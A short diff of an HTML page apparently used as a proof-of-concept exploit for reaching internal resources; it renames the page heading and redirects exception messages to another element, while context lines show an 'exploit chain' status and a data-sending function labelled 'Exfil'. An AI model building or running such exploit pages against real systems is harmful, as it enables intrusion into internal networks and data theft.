@@ -9,7 +9,7 @@
     </style>
 </head>
 <body>
-    <h1>Internal Resource Access 3</h1> 
+    <h1>Internal Resource Access 4</h1> 
     
     <div class="box">
         <p id="exploit-status">Initializing exploit chain...</p>
@@ -57,7 +57,7 @@
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ type: type, log: message })
             }).catch(e => {
-                document.getElementById('exploit-status').innerText = 'exception: ' + e + '  -  ' + e.message;
+                document.getElementById('details').innerText = 'exception: ' + e + '  -  ' + e.message;
                 console.error("Exfil failed", e)
             });
         }
@@ -108,7 +108,7 @@
                         });
                     } catch (e) {
                         console.log('exception: ' + e + '  -  ' + e.message)
-                        document.getElementById('exploit-status').innerText = 'exception: ' + e + '  -  ' + e.message;
+                        document.getElementById('details').innerText = 'exception: ' + e + '  -  ' + e.message;
                     }
                 }
             }, 2000);
